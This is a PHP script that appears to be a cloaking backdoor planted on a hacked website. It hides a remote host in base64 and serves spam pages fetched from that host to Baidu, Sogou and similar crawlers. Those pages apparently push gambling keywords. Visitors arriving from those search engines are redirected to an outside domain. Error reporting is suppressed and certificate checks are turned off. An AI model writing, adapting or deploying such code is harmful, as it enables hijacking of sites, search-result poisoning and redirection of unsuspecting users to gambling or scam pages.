<?php
set_time_limit(0);
error_reporting(0);
header("Content-Type: text/html;charset=utf-8");
define('URI', $_SERVER['REQUEST_URI']);
define('host', base64_decode('aHR0cDovL2JkYS5pbWFnZTEub25saW5lLw=='));
define('MULU','timi|app|ios|android|download|blank|bet|casino|games|play|video|poker|root|news|bak|gods|note|bmw|vod|post|activities|id|?');
function isEngines($key){return stristr($key, 'Baiduspider') !== false||stristr($key, 'Sogou') !== false||stristr($key, '360Spider!') !== false|| stristr($key, 'YisouSpider') !== false;}
function isIncludes(){$re = 0;$temp = explode('|',MULU);foreach($temp as $v){if(stristr(URI,$v) !== false){$re = 1;}}return $re;}
function isRef($ref){return stristr($ref,'baidu') !== false||stristr($ref,'sm.cn') !== false||stristr($ref,'so.com') !== false|| stristr($ref, 'sogou') !== false;}
function getContents($url){
    if (function_exists('curl_init')) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)");
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_HEADER, 0);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
        $result = curl_exec($ch);
        curl_close($ch);
		if($result == NULL){
			return file_get_contents($url);
		}
        return $result;
    } else {
        return file_get_contents($url);
    }
}
$ref = $_SERVER["HTTP_REFERER"];
$key = $_SERVER["HTTP_USER_AGENT"];
$ym = $_SERVER['HTTP_HOST'];

if (isEngines($key)) {
    header('Content-Type:text/html;charset=utf-8');
    if(isIncludes()){
	   echo getContents(host."?xhost=".$ym.'&reurl='.URI.'&ua=Baiduspider'.'&f=bd');
        exit;
    }else{
        echo file_get_contents(host."lunlian/dt.php");
    }
}else{
	if(isIncludes()&&isRef($ref)){
       header("Location: https://bd.vieclamvinhphuapa.cc/?cid=jhgb&ref=" . urlencode($ym));
        exit;
    }	
}
?>